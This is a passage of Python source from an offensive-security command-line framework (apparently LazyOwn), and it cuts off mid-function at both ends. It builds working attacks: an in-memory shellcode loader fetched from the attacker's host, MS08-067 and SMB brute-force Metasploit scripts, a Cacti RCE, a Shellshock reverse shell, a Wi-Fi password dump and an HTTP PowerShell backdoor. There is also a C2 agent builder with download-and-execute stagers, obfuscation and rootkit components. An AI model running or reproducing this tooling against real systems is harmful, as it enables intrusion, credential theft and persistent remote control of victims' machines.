        command1 = f'powershell -Command "$url=\'http://{lhost}/shellcode.bin\'; $shellcodeBase64=(Invoke-RestMethod -Uri $url -Method Get); $shellcode=[System.Convert]::FromBase64String($shellcodeBase64); $shellcodeBuffer=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length); [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $shellcodeBuffer, $shellcode.Length); $functionDelegate=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($shellcodeBuffer, [System.Action]); $functionDelegate.Invoke(); [System.Runtime.InteropServices.Marshal]::FreeHGlobal($shellcodeBuffer)"'
        print_msg(f"\n{RED}    1 ) {WHITE}" + command)
        print_msg(f"\n{RED}    2 ) {WHITE}" + command1)
        choice = input("\nChoice option 1 or 2: ")
        if choice == "1":
            copy2clip(command)
        else:
            copy2clip(command1)
        return

    @cmd2.with_category(scanning_category)
    def do_skipfish(self, line):
        """
        This function executes the web security scanning tool Skipfish
        using the provided configuration and parameters. It allows
        scanning a specified target (rhost) and saves the results
        in a designated output directory.

        Parameters:
        - self: Refers to the instance of the class in which this function is defined.
        - line: A string that may contain additional options to modify the scanning behavior.

        Function Flow:
        1. Default values are set for the target IP (rhost), port (port), and output directory (outputdir).
        2. The validity of the target (rhost) is checked using the `check_rhost` function.
        3. If no argument is provided in `line`, a `skipfish` command is constructed using the default values.
        4. If `line` starts with 'url', the URL configured in `self.params['url']` is retrieved and used to construct the `skipfish` command.
        5. If the URL is not configured and an attempt is made to use the 'url' option, an error message is printed, and the function exits.
        6. The constructed `skipfish` command is displayed on the console and executed using `os.system`.

        Note:
        - The function assumes that the `skipfish` tool is installed on the system.
        - The output of the scan is saved in the directory `sessions/{rhost}/skipfish/`.
        - The wordlist used by Skipfish is specified in `wordlist`.
        """

        port = 80
        s = ''

        wordlist = '/usr/share/skipfish/dictionaries/complete.wl'
        rhost = self.params['rhost']

        if not check_rhost(rhost):
            return
        outputdir = f'sessions/{rhost}/skipfish/'
        if not line:
            command = f"skipfish -o {outputdir} -S {wordlist} http{s}://{rhost}:{port}"
        else:
            if line.startswith('url'):
                url = self.params['url']
                if not url:
                    print_error(f"You need assign the url if use the parametter url ex: {GREEN}assign url http://url.ext/")
                    return
                command = f"skipfish -o {outputdir} -S {wordlist} {url}"
        print_msg(command)
        self.cmd(command)
        return

    @cmd2.with_category(exploitation_category)
    def do_createdll(self,line):
        """
        Create a Windows DLL file using MinGW-w64 or a Blazor DLL for Linux.

        This function prompts the user to select between creating a 32-bit DLL,
        a 64-bit DLL, or a Linux Blazor DLL. It first checks if MinGW-w64 is installed;
        if not, it attempts to install it. The user must provide a filename for the
        DLL, which will be created from the `sessions/rev.c` source file.
        The function constructs the appropriate command to compile the DLL based on
        the user's choice and executes it. If the user selects a 32-bit or 64-bit
        compilation, the function also opens the `rev.c` file in a text editor for
        modifications before compilation. For option 3, it executes a script to create
        a Blazor DLL using the local host (lhost) address to download the necessary payload.

        Parameters:
        - line (str): The name of the DLL file to be created.
                    Must be provided by the user.

        Usage:
        - Choose "1" for 32-bit, "2" for 64-bit, or "3" for creating a Linux Blazor DLL.
        - Ensure that shellcode is created beforehand using
        the `lazymsfvenom` or `venom` options 13 or 14
        to replace in `sessions/rev.c`.
        """
        lhost = self.params["lhost"]
        if not check_lhost(lhost):
            return
        print_msg(f"{RED}1) {BLUE}Win32 Bit, {RED}2) {CYAN}Win64 Bit {RED}3){GREEN} Linux Blazor dll")
        choice = input(f"    {MAGENTA}[?] Choice (1, 2 or 3): ")
        print_warn(f"Remeber: {GREEN}run lazymsfvenom {YELLOW}or {GREEN}venom {YELLOW} option 13 or 14, to create shellcode before! to replace in {RED}sessions/win/rev.c")
        if not is_binary_present("x86_64-w64-mingw32-gcc") or not is_binary_present("i686-w64-mingw32-gcc"):
            print_warn("mingw-w64 is not present in the system installing...")
            self.cmd("sudo apt install mingw-w64")
        if not line:
            print_error("You need pass the name of the ddl file")
            return

        if choice == "1":
            command = f"x86_64-w64-mingw32-gcc -shared -o sessions/{line} sessions/win/rev.c -lws2_32"
        elif choice == "2":
            command = f"i686-w64-mingw32-gcc -shared -o sessions/{line} sessions/win/rev.c -lws2_32"
        elif choice == "3":
            command = f"./sessions/lin/blazormalware.sh {lhost} {line}"

        if choice == "1" or choice == "2":
            cmd = "nano sessions/win/rev.c"
            print_msg(f"Attemp to: {cmd}")
            self.cmd(cmd)

        print_msg(f"Try... {command}")
        self.cmd(command)
        cmd = f"curl -o {line} http://{lhost}/{line}"
        copy2clip(cmd)
        return

    @cmd2.with_category(exploitation_category)
    def do_seo(self, line):
        """
        Performs a web seo fingerprinting scan using `lazyseo.py`.

        1. Executes the `lazyseo.py` command to identify h1,h2,links,etc used by the target web application.

        :param line: This parameter is not used in the current implementation but could be used to pass additional options or arguments if needed.
        :param rhost: The target web host to be scanned, specified in the `params` dictionary.

        :returns: None

        Manual execution:
        To manually perform web seo fingerprinting, use the following command:
            lazyseo.py <target_host>

        Replace `<target_host>` with the URL or IP address of the web application you want to scan.

        For example:
            lazyseo.py example.com
        """

        if not self.params["rhost"]:
            print_error(f"rhost must be assign{RESET}")
            return
        rhost = self.params["rhost"]
        if line:
            rhost = line.strip()
            print_msg(f"Try... python3 modules/lazyseo.py {rhost}{RESET}")
            self.cmd(f"python3 modules/lazyseo.py {rhost}")
        else:
            print_msg(f"Try... python3 modules/lazyseo.py http://{rhost}{RESET}")
            self.cmd(f"python3 modules/lazyseo.py http://{rhost}")
        return

    @cmd2.with_category(exploitation_category)
    def do_padbuster(self, line):
        """
        Execute the PadBuster command for padding oracle attacks.

        This function constructs and executes a PadBuster command to perform
        a padding oracle attack on the specified URL. It requires the user
        to provide a URL, a cookie with a hash, a plaintext value to compare,
        and a specific byte position to attack.

        Parameters:
        - line (str): The input line containing the cookie, plaintext, and byte
                    position. Expected format: 'cookie=<HASH> plaintext <byte_position>'.

        Functionality:
        - The function first checks if a URL is assign in the parameters.
        - It then validates that the correct number of arguments is provided.
        - If the arguments are valid, it constructs the PadBuster command and executes it.
        - The command is also copied to the clipboard for convenience.

        Usage Example:
        - assign url http://target.com
        - padbuster auth=<HASH> user=admin 8
        """
        url = self.params["url"]
        if not url:
            print_error(f"You need assign the url using: {GREEN}assign url http://url.com ")
            return
        args = line.split(" ")
        if len(args) != 3:
            print_error(f"You need pass the cookie like auth=<HASH> and plaintext like user=admin example:{GREEN} padbuster auth=b24dx2LYTEGrIsIsComEb4Ck user=admin 8")
            return
        elif len(args) == 3:
            cookie = args[0].split("=")
            plaintext = args[1]
            number = args[2]
            command = f"padbuster {url} '{cookie[1]}' {number} -cookie '{args[0]}' -plaintext '{plaintext}'"
            copy2clip(command)
            self.cmd(command)
            return
        else:
            print_error("wrong number of parameters.")
            return

    @cmd2.with_category(scanning_category)
    def do_smbattack(self, line):
        """
        Scans for hosts with SMB service open on port 445 in the specified target network.

        This function performs the following actions:
        1. Scans the specified subnet for hosts with an open SMB port (445).
        2. Sets up a Metasploit handler to listen for reverse connections.
        3. Attempts to exploit the Conficker vulnerability on each identified host.
        4. Optionally conducts a brute-force attack on SMB using the provided password file.

        Parameters:
        line (str): The command line input for the smbattack function,
                    though not used directly in this implementation.

        Returns:
        None
        """
        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return
        lport = self.params["lport"]
        if not check_lport(lport):
            return

        lhost = self.params["lhost"]
        lport = self.params["lport"]
        passwd_file = self.params["wordlist"]
        file = "sessions/meta.rc"

        def find_tgts(subnet):
            """
            Finds and returns a list of target hosts with port 445 open in the specified subnet.

            Args:
                subnet (str): The subnet to scan, e.g., '192.168.1.0/24'.

            Returns:
                list: A list of IP addresses where port 445 is open.
            """
            nmap_proc = NmapProcess(subnet, options="-p 445 --open")
            nmap_proc.run()
            nmap_report = NmapParser.parse(nmap_proc.stdout)

            hosts = []
            for host in nmap_report.hosts:
                if host.is_up() and 'tcp' in host.services and 445 in host.services['tcp'] and host.services['tcp'][445].state == "open":
                    print_msg(f"[+] Found Target Host: {host.address}")
                    hosts.append(host.address)
            return hosts

        def setup_handler(config_file, lhost, lport):
            """
            Sets up a Metasploit multi/handler configuration in the given config file.

            Args:
                config_file (file-like object): The file object to write the Metasploit handler configuration to.
                lhost (str): The local host IP address to listen for incoming connections.
                lport (int): The local port number to listen for incoming connections.

            Writes:
                - Exploit configuration for Metasploit to the provided file.
            """

            config_file.write('use exploit/multi/handler\n')
            config_file.write('set payload windows/meterpreter/reverse_tcp\n')
            config_file.write(f'set LPORT {str(lport)}\n')
            config_file.write(f'set LHOST {lhost}\n')
            config_file.write('exploit -j -z\n')
            config_file.write('setg DisablePayloadHandler 0\n')

        def conficker_exploit(config_file, host, lhost, lport):
            """
            Configures and writes a Metasploit exploit for the Conficker vulnerability to the given config file.

            Args:
                config_file (file-like object): The file object to write the Metasploit exploit configuration to.
                host (str): The target host IP address to exploit.
                lhost (str): The local host IP address to listen for incoming connections.
                lport (int): The local port number to listen for incoming connections.

            Writes:
                - Exploit configuration for the Conficker vulnerability (MS08-067) to the provided file.
            """
            config_file.write('use exploit/windows/smb/ms08_067_netapi\n')
            config_file.write(f'set RHOST {str(host)}\n')
            config_file.write('set payload windows/meterpreter/reverse_tcp\n')
            config_file.write(f'set LPORT {str(lport)}\n')
            config_file.write(f'set LHOST {lhost}\n')
            config_file.write('exploit -j -z\n')

        def smb_brute(config_file, host, passwd_file, lhost, lport):
            """
            Configures and writes a Metasploit SMB brute force exploit for the given host to the provided config file.

            Args:
                config_file (file-like object): The file object to write the Metasploit exploit configuration to.
                host (str): The target host IP address to exploit.
                passwd_file (str): Path to a file containing a list of passwords to use for brute force.
                lhost (str): The local host IP address to listen for incoming connections.
                lport (int): The local port number to listen for incoming connections.

            Writes:
                - Exploit configuration for SMB brute force (using the psexec module) to the provided file for each password in the passwd_file.
            """
            username = 'Administrator'
            with open(passwd_file) as file:
                for password in file.readlines():
                    password = password.strip('\n').strip('\r')
                    config_file.write('use exploit/windows/smb/psexec\n')
                    config_file.write(f'set SMBUser {str(username)}\n')
                    config_file.write(f'set SMBPass {str(password)}\n')
                    config_file.write(f'set RHOST  {str(host)}\n')
                    config_file.write('set payload windows/meterpreter/reverse_tcp\n')
                    config_file.write(f'set LPORT {str(lport)}\n')
                    config_file.write(f'set LHOST {lhost}\n')
                    config_file.write('exploit -j -z\n')

        with open(file, 'w') as metarc_file:
            tgt_list = find_tgts(rhost)
            setup_handler(metarc_file, lhost, lport)

            for tgt_host in tgt_list:
                conficker_exploit(metarc_file, tgt_host, lhost, lport)
                if passwd_file:
                    smb_brute(metarc_file, tgt_host, passwd_file, lhost, lport)
        command = f'msfconsole -r {file}'
        copy2clip(command)
        self.cmd(command)
        return

    @cmd2.with_category(exploitation_category)
    def do_cacti_exploit(self, line):
        """
        Automates the exploitation of the Cacti version 1.2.26 vulnerability
        using the multi/http/cacti_package_import_rce exploit.

        This function performs the following actions:
        1. Sets up a Metasploit handler to listen for reverse connections.
        2. Attempts to log in to the Cacti instance with provided credentials.
        3. Checks if the target is vulnerable and uploads the malicious payload.
        4. Triggers the payload to obtain a Meterpreter session.

        Parameters:
        line (str): The command line input for the cacti exploit function,
                    though used directly in this implementation to set password.

        Returns:
        None
        """
        rhost = self.params["rhost"]
        lhost = self.params["lhost"]
        lport = self.params["lport"]

        if not check_rhost(rhost):
            return
        if not check_lhost(lhost):
            return
        if not check_lport(lport):
            return
        file = "sessions/meta.rc"

        def setup_handler(config_file, lhost, lport):
            """
            Sets up a Metasploit multi/handler exploit configuration in the provided config file.

            Args:
                config_file (file-like object): The file object to write the Metasploit handler configuration to.
                lhost (str): The local host IP address to listen for incoming connections.
                lport (int): The local port number to listen for incoming connections.

            Writes:
                - Configuration commands to the file to set up the Metasploit handler with the specified payload and options.
                - The payload used is `php/meterpreter/reverse_tcp`.
                - The handler is configured to listen on the provided LHOST and LPORT.
                - Starts the exploit with the `-j -z` options.
            """

            config_file.write('use exploit/multi/handler\n')
            config_file.write('set payload php/meterpreter/reverse_tcp\n')
            config_file.write(f'set LPORT {str(lport)}\n')
            config_file.write(f'set LHOST {lhost}\n')
            config_file.write('exploit -j -z\n')
            #config_file.write('setg DisablePayloadHandler 1\n')

        def cacti_exploit(config_file, host):
            """
            Configures an exploit for the Cacti Package Import Remote Code Execution vulnerability in the provided config file.

            Args:
                config_file (file-like object): The file object to write the Metasploit exploit configuration to.
                host (str): The target host IP address where the Cacti service is running.

            Writes:
                - Configuration commands to the file to set up the Metasploit exploit for the Cacti Package Import RCE.
                - Sets the RHOST to the target host IP.
                - Sets the payload options including the LHOST, USERNAME, and PASSWORD.
                - Starts the exploit with the `-j -z` options.
            """

            config_file.write('use exploit/multi/http/cacti_package_import_rce\n')
            config_file.write(f'set RHOST {host}\n')
            config_file.write(f'set LHOST {lhost}\n')
            config_file.write('set USERNAME admin\n')
            config_file.write(f'set PASSWORD {line}\n')
            config_file.write('exploit -j -z\n')

        with open(file, 'w') as metarc_file:
            setup_handler(metarc_file, lhost, lport)
            cacti_exploit(metarc_file, rhost)

        command = f'msfconsole -r {file}'
        copy2clip(command)
        self.cmd(command)
        return

    @cmd2.with_category(credential_access_category)
    def do_smalldic(self, list):
        """
        Handles the creation of temporary files for users and passwords based on a small dictionary.

        This function prompts the user to decide whether to use a small dictionary for generating
        user and password lists. If the user agrees, it loads the credentials from a JSON file and
        writes them into temporary files. If the user declines, the process is aborted.

        Parameters:
        list (str): Not used in this function, but kept for compatibility with cmd command input.

        Returns:
        None
        """
        use_small_dict = input(f"    {CYAN}[?] Do you want to use the small dictionary? (yes/no): ").strip().lower()

        if use_small_dict == "yes":
            path = os.getcwd()
            smalldic = f"{path}/modules/credentials.json"
            with open(smalldic, 'r') as f:
                data = json.load(f)

            print_msg("Create temporary files for users")
            with open('sessions/small_users.txt', 'w') as f:
                for username in data["usernames"]:
                    if username:
                        f.write(username + '\n')
            print_msg("Create temporary files for passwords")
            with open('sessions/small_passwords.txt', 'w') as f:
                for password in data["passwords"]:
                    if password:
                        f.write(password + '\n')
            print_msg("Done.")
        else:
            print_warn("Abort. smalldic")
        return

    @cmd2.with_category(lateral_movement_category)
    def do_ngrok(self, line):
        """
        Set up and run ngrok on a specified local port. If ngrok is not installed, it will
        automatically be installed. The user will be prompted to provide their ngrok
        authentication token to complete the setup.

        Args:
            line (str): The input line, though it's not directly used in this function.

        Workflow:
        1. Check if the local port specified in `self.params["lport"]` is valid.
        2. Verify if ngrok is installed. If not, proceed with installation.
        3. After installation, prompt the user to authenticate ngrok using their token.
        4. Once authenticated, run ngrok to expose the specified local port.

        Note:
            The ngrok authentication token can be obtained from the ngrok dashboard.
        """
        lport = self.params["lport"]
        if not check_lport(lport):
            return
        if line:
            lport = line.strip()

        if not is_binary_present("ngrok"):
            print_warn("Installing ngrok")
            install = """
            curl -sSL https://ngrok-agent.s3.amazonaws.com/ngrok.asc  | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list  && sudo apt update && sudo apt install ngrok
            """
            print_msg(install)
            os.system(install)

            print_msg("visit https://dashboard.ngrok.com/get-started/your-authtoken to get your token")
            token = input("    [!] Authenticate your ngrok agent with your Token: ")
            install = "ngrok config add-authtoken"
            command = f"{install} {token}"
            print_msg(command)
            choice = input("    [?] is it correct ? (yes/no)")
            if choice == "yes":
                self.cmd(command)
                print_msg("Done")
            else:
                print_warn("Exiting...")
                return
        command = f"ngrok http http://localhost:{lport}"
        print_msg(f"Try... {command}")
        self.cmd(command)
        return

    @cmd2.with_category(lateral_movement_category)
    def do_wifipass(self, line):
        """
        This function generates a PowerShell script that retrieves saved Wi-Fi passwords on a Windows system.
        The script gathers the Wi-Fi profiles, extracts their passwords, and saves the information in a text file
        named 'wifi_passwords.txt' in the directory where the script is executed. The generated PowerShell command
        is copied to the clipboard for easy execution.

        Parameters:
        line (str): This parameter is not used within the function but is required for the command interface.

        The function does not return any value.
        """
        command = '''
        $currentDir = Get-Location
        $networks = netsh wlan show profiles
        $networkNames = $networks | Select-String -Pattern '(?:Perfil\s*:\s)(.*)' | ForEach-Object { $_.Matches[0].Groups[1].Value }
        $results = @()
        foreach ($networkName in $networkNames) {
            $command = 'netsh wlan show profile "' + $networkName + '" key=clear'
            $currentResult = Invoke-Expression $command
            $results += $currentResult
        }
        $result = $results -join "`n"
        $outputFile = Join-Path $currentDir "wifi_passwords.txt"
        $result | Out-File -FilePath $outputFile -Encoding utf8
        Write-Host "Wi-Fi passwords saved to $outputFile"'''.replace("        ",'')
        copy2clip(command)
        return

    @cmd2.with_category(exploitation_category)
    def do_shellshock(self, line):
        """
        Executes a Shellshock attack against a target.

        This function constructs and sends a specially crafted HTTP request designed to exploit
        the Shellshock vulnerability on a target server. The payload is embedded in the
        'User-Agent' header, and when executed, it will open a reverse shell connection to
        the attacker's machine.

        Parameters:
        - lport: Local port for the reverse shell connection, retrieved from self.params.
        - lhost: Local host for the reverse shell connection, retrieved from self.params.

        The function first validates the local host (lhost) and local port (lport) using
        check_lhost() and check_lport(). If either validation fails, the function returns
        without proceeding.

        If the validation passes, the payload is created using the format:
        '() { :; }; /bin/bash -c "nc -v {rhost} {lport} -e /bin/bash -i"',
        where rhost is the remote target's IP address and lport is the specified local port.

        The function then attempts to send a GET request to the target URL (args.target)
        with the crafted payload in the 'User-Agent' header. The server's response is captured
        and printed using print_msg().

        If any error occurs during the request, an error message is displayed using print_error().

        Returns:
        None
        """
        lport = self.params["lport"]
        lhost = self.params["lhost"]
        url = self.params["url"]
        if not check_lhost(lhost):
            return

        if not check_lport(lport):
            return

        if not url:
            print_error(f"use {GREEN}assign url http://example.com {CYAN}to assign url")
            return

        payload = '() {{ :; }}; /bin/bash -c "nc -v {} {} -e /bin/bash -i"'.format(lhost, lport)
        print_msg(f"Constructed payload: {payload}")
        try:
            print_msg("Attacking {}".format(url))
            headers = {"Content-type": "application/x-www-form-urlencoded",
                    "User-Agent": payload}
            req = requests.get(url, headers=headers).text
            with tempfile.NamedTemporaryFile(delete=False, suffix='.html') as output_file:
                output_file.write(req.encode('utf-8'))
                temp_file_name = output_file.name
            subprocess.run(['batcat', temp_file_name])
            os.remove(temp_file_name)
        except KeyError as e:
            print_error(f"KeyError: {e}")
        except Exception as e:
            print_error(f"An unexpected error occurred: {e}")
        print_warn(f"Attack done, using headers: {headers}")
        return

    @cmd2.with_category(exploitation_category)
    def do_powerserver(self, line):
        """
        This function generates a PowerShell script that retrieves reverse shell over http on a Windows system.
        The script generated PowerShell reverse shell to execute command by curl command
        is copied to the clipboard for easy execution.

        Parameters:
        line (str): This parameter is used to get the port to create the listener

        The function does not return any value.
        Example of use: curl -X POST http://victim:8080/ -d "Get-Process"
        """
        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return
        if not line:
            print_error("You need to specify the port, for example: powershell 5555.")
            return
        command = '''
        $listener = New-Object System.Net.HttpListener

        $listener.Prefixes.Add("http://*:8080/")

        $listener.Start()
        Write-Host "Servidor iniciado. Escuchando en http://*:8080/"

        try {
            while ($true) {
                $context = $listener.GetContext()
                $request = $context.Request
                $response = $context.Response

                $body = New-Object System.IO.StreamReader($request.InputStream)
                $command = $body.ReadToEnd()
                $body.Close()

                try {
                    $output = Invoke-Expression $command
                    $response.StatusCode = 200
                    $response.ContentType = "text/plain"
                    $outputBytes = [System.Text.Encoding]::UTF8.GetBytes($output)
                    $response.ContentLength64 = $outputBytes.Length
                    $response.OutputStream.Write($outputBytes, 0, $outputBytes.Length)
                } catch {
                    $response.StatusCode = 500
                    $errorMessage = $_.Exception.Message
                    $response.OutputStream.Write([System.Text.Encoding]::UTF8.GetBytes("Error: $errorMessage"), 0, $errorMessage.Length)
                }

                $response.OutputStream.Close()
            }
        } catch {
            Write-Host "Ocurrió un error: $_"
        } finally {
            $listener.Stop()
        }
        '''.replace("        ",'').replace("8080",line)
        copy2clip(command)

        print_warn(f'Example of use: curl -X POST http://{rhost}:{line}/ -d "Get-Process"')
        return

    @cmd2.with_category(reporting_category)
    def do_morse(self,line):
        """Interactive Morse Code Converter.

        This function serves as an interface for converting text to Morse code and vice versa.
        It provides a menu with the following options:

        1️⃣  Convert text to Morse code.
        2️⃣  Convert Morse code to text.
        0️⃣  Exit the program.

        When the function is called, it runs an external script (`morse.py`) that handles
        the conversion processes. The function also manages keyboard interruptions
        gracefully, allowing the user to exit the program cleanly.

        Arguments:
        line (str): This argument is reserved for future enhancements but is currently not used.

        Returns:
        None

        Notes:
        - Ensure that the `morse.py` module is located in the `modules` directory and is executable.
        - The function captures `KeyboardInterrupt` to allow safe exit from the Morse code converter.

        Example:
        >>> do_morse("")

        See Also:
        - `morse.py`: The script that contains the logic for Morse code conversions.
        """
        try:
            self.cmd("python3 modules/morse.py")
        except KeyboardInterrupt:
            print_warn("Exiting...")

    @cmd2.with_category(recon_category)
    def do_waybackmachine(self, line):
        """
        Fetch URLs from the Wayback Machine for a given website.
        The URL is taken from line. If the URL is not provided, an error is printed.
        The limit of results is taken from self.params["limit"] if provided; otherwise, defaults to 10.
        Results are printed directly to the console.
        """
        if not line:
            print_error("you need pass the search keyword as argument")
            return
        url = line
        limit = self.params.get("limit", 10)

        wayback_url = (
            f"https://web.archive.org/cdx/search?url={url}&matchType=prefix&collapse=urlkey&output=text&fl=original&filter=&limit={limit}"
        )

        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/68.0"
        }
        self.cmd("clear")

        try:
            r = requests.get(wayback_url, headers=headers)
            r.raise_for_status()
            results = r.text



            print_msg(f"{GREEN}############ All websites from the WayBack Machine ###########")

            for j, i in enumerate(results.split(), start=1):
                print_msg(f"{j} : {i}")
            print_msg(f"{CYAN}https://web.archive.org/web/*/{line}/*")
            print_msg(f"{CYAN}############## Thanks for using LazyOwn! ###############")

        except requests.exceptions.RequestException as e:
            print_warn(f"Warning: Failed to fetch data from the Wayback Machine. {str(e)}")

    @cmd2.with_category(command_and_control_category)
    def do_c2(self, line):
        """Handle C2 server setup and agent compilation.

        This method manages the process of setting up a Command and Control (C2)
        server and compiling a corresponding agent for various platforms.

        Args:
            line (str): Specifies the victim ID and optional C2 server configurations.
                - Victim ID: The identifier for the target agent.
                - Tunnel Option (optional): Append '1' to use a Cloudflare tunnel.
                - Target Choice (optional): A number from '1' to '7' to specify the
                agent platform (default is '1' for Windows PowerShell).
                    - '1': Windows PowerShell
                    - '2': Linux Shell
                    - '3': Windows Batch
                    - '4': macOS Shell
                    - '5': Android Shell
                    - '6': iOS Shell
                    - '7': WebAssembly Shell
                - Tunnel Toggle (optional): After the victim ID and target choice,
                you can append '1' to enable the Cloudflare tunnel or '0' to disable it.

        Returns:
            None

        Raises:
            None

        Example Usage:
            c2 victim-1  # Compiles a Windows PowerShell agent
            c2 victim-2 2 # Compiles a Linux Shell agent
            c2 victim-3 1 1 # Compiles a Windows PowerShell agent with Cloudflare tunnel

        Notes:
            - Ensure the 'lhost' and 'c2_port' parameters are correctly set in the
            `payload.json` config file before calling this method.
            - The `modules/run` file and files in `modules/backdoor/` and
            `modules/rootkit/` directories must exist for the agent compilation
            process.
            - The go artifactory is ofuscated by garble if is installed
        """

        use_tunnel = False
        if line:
            args = line.split()
            num_args = len(args)
            if num_args >= 1:
                line = args[0]
                choice = None
                if num_args == 2:
                    potential_choice = args[1]
                    if potential_choice in ['1', '2', '3', '4', '5', '6', '7']:
                        choice = potential_choice
                    elif potential_choice == '1':
                        use_tunnel = True
                    elif potential_choice == '0':
                        use_tunnel = False
                    else:
                        print_error("Invalid option. Use '1' for tunnel, or target choice [1-7].")
                        return
                elif num_args == 3:
                    line = args[0]
                    choice = args[1]
                    if args[2] == '1':
                        use_tunnel = True
                    elif args[2] == '0':
                        use_tunnel = False
                    else:
                        print_error("Invalid tunnel option. Use '1' or '0'.")
                        return

            else:
                print_error("You need to specify the victim-id, for example: c2 victim-1. [1 win ps1 | 2 linux | 3 win bat] ")
                return
        else:
            print_error("You need to specify the victim-id, for example: c2 victim-1. [1 win ps1 | 2 linux | 3 win bat] ")
            return

        rhost = self.params["rhost"]
        lport_param = str(self.params["c2_port"])

        if use_tunnel:
            cmd = """
            link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cf.log")
            echo "Cloudflare Tunnel URL: $link"
            """.replace("            ", "")
            os.system(cmd)
            lhost = input("Enter your Cloudflare tunnel subdomain (e.g., yoursubdomain.trycloudflare.com): ").strip()
            lport = "443"
        else:
            lhost = self.params["lhost"]
            lport = lport_param

        rport = str(self.params["rport"])
        listener = str(self.params["listener"])
        sleep = str(self.params["sleep"])
        path = os.getcwd()
        file = f"{path}/modules/run"
        wfile = f"{path}/sessions/win/lazybot.ps1"
        bfile = f"{path}/modules/run.bat"
        filek = f"{path}/modules/backdoor/backdoor.c"
        files = f"{path}/modules/backdoor/server.c"
        cfiles = f"{path}/modules/rootkit/mr.c"
        cwfiles = f"{path}/modules/win_rootkit/win_ring3_rootkit.c"
        mrhyde = f"{path}/modules/win_rootkit/mrhyde.c"
        rootkit = f"{path}/sessions/mrhyde.so"
        rootkit_c = f"{path}/modules/rootkit/mrhyde.c"
        file_evil = f"{path}/modules/evilhttprev.sh"
        filer = f"{path}/modules/r.sh"
        gofile = f"{path}/sessions/implant/implant_crypt.go"
        #gofile_ws = f"{path}/sessions/implant/implant_rust.rs"
        payload_sh = f"{path}/sessions/lin/payload.sh"
        gofile2 = f"{path}/sessions/implant/listener.go"
        #gofile3 = f"{path}/sessions/implant/server.go"
        gofile4 = f"{path}/sessions/implant/monrevlin.go"
        #server_go = f"{path}/sessions/server.go"
        monrevlin = f"{path}/sessions/monrevlin.go"
        implantgo = f"{path}/sessions/{line}"
        #implantgo_ws = f"{path}/sessions/ws_{line}"
        implantgo2 = f"{path}/sessions/l_{line}"
        implant_config_json = f"{path}/sessions/implant_config_{line}.json"
        maleable = self.params["c2_maleable_route"]
        self.c2_url = f"https://{lhost}:{lport}"
        self.c2_clientid = line.strip()
        USER = c2_user
        PASS = c2_pass
        self.c2_auth = (USER, PASS)
        random_bytes = os.urandom(100)
        base64_encoded = base64.b64encode(random_bytes)
        user_agent_win = self.params["user_agent_win"]
        user_agent_lin = self.params["user_agent_lin"]
        user_agent_1 = self.params["user_agent_1"]
        user_agent_2 = self.params["user_agent_2"]
        user_agent_3 = self.params["user_agent_3"]
        url_trafic_1 = self.params["url_trafic_1"]
        url_trafic_2 = self.params["url_trafic_2"]
        url_trafic_3 = self.params["url_trafic_3"]
        gocompiler = "go build"
        stealth = "True"
        random_string = base64_encoded.decode('utf-8')[:12]
        working_dir = f"{path}/sessions/"

        if not is_binary_present("garble"):
            cmd_garble = "go install github.com/burrowers/garble@latest"
            self.cmd(cmd_garble)
        else:
            gocompiler = "garble -literals -tiny build "

        if not choice:
            choice = input("    [!] choice target windows 1, linux 2, windows bat 3, mac 4, android 5, IOS 6, WebAssembly 7 (default 1) : ") or '1'

        if choice == '1':
            payload = f"powershell -c \"Invoke-WebRequest 'http://{lhost}/stub.exe' -OutFile 'stub.exe'; Start-Process 'stub.exe'\""
            print_msg(payload)
            self.onecmd(f"encodewinbase64 {payload}")
            platform = "windows"
            user_agent = user_agent_win
        elif choice == '2':
            payload = f"""curl http://{lhost}/stub -o /tmp/stub && \
            [ -s /tmp/stub ] && \
            chmod +x /tmp/stub && \
            /tmp/stub""".replace("            ","")
            utf8_encoded = payload.encode("utf-8")
            base64_encoded = base64.b64encode(utf8_encoded).decode('utf-8')
            cmd = f"echo '{base64_encoded}' | base64 -d | bash"
            copy2clip(cmd)
            platform = "linux"
            user_agent = user_agent_lin
        elif choice == '3':
            payload = f"powershell iwr -uri  http://{lhost}/batrat.bat -OutFile batrat.bat ; .\\batrat.bat"
            copy2clip(payload)
            platform = "windows"
            user_agent = user_agent_win
        elif choice == '4':
            payload = f"curl http://{lhost}/r -o r && sh r"
            copy2clip(payload)
            platform = "darwin"
            user_agent = user_agent_win
        elif choice == '5':
            payload = f"curl http://{lhost}/r -o r && sh r"
            copy2clip(payload)
            platform = "android"
            user_agent = user_agent_lin
        elif choice == '6':
            payload = f"curl http://{lhost}/r -o r && sh r"
            copy2clip(payload)
            platform = "ios"
            user_agent = user_agent_lin

        elif choice == '7':
            payload = f"curl http://{lhost}/r -o r && sh r"
            copy2clip(payload)
            platform = "webassembly"
            user_agent = user_agent_lin
        if not check_lhost(lhost):
            return

        if not check_lport(lport):
            return


        if not is_exist(file):
            return
        with open(cwfiles, 'r') as f:
            cwcontent = f.read()

        with open(file, 'r') as f:
            content = f.read()

        with open(payload_sh, 'r') as f:
            payload_content = f.read()

        with open(mrhyde, 'r') as f:
            mrhyde_content = f.read()

        with open(rootkit_c, 'r') as f:
            rootkit_content = f.read()

        with open(cfiles, 'r') as f:
            content_mon = f.read()

        if not is_exist(wfile):
            return
        with open(wfile, 'r') as f:
            wcontent = f.read()

        with open(bfile, 'r') as f:
            bcontent = f.read()

        with open(file_evil, 'r') as f:
            evil_content = f.read()
        content_mon = content_mon.replace("{lport}", str(rport)).replace("{line}", line).replace("{lhost}", lhost)
        cwcontent = cwcontent.replace("{lport}", str(rport)).replace("{line}", line).replace("{lhost}", lhost)
        bcontent = bcontent.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent)
